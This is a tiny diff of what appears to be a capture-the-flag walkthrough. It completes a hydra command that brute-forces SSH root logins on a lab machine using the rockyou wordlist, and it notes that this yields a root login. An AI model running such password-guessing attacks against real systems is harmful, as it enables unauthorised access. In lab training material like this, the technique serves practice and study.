@@ -54,6 +54,6 @@ page source index.html:
 Dont Overthink. Really, Its simple.
 	<!-- Trust me -->
 
-hydra -l root -P <locate rockyou.txt>
+hydra -l root -P <locate rockyou.txt> ssh://MACHINE_IP -I -t4
 
 after this command --> logged as root
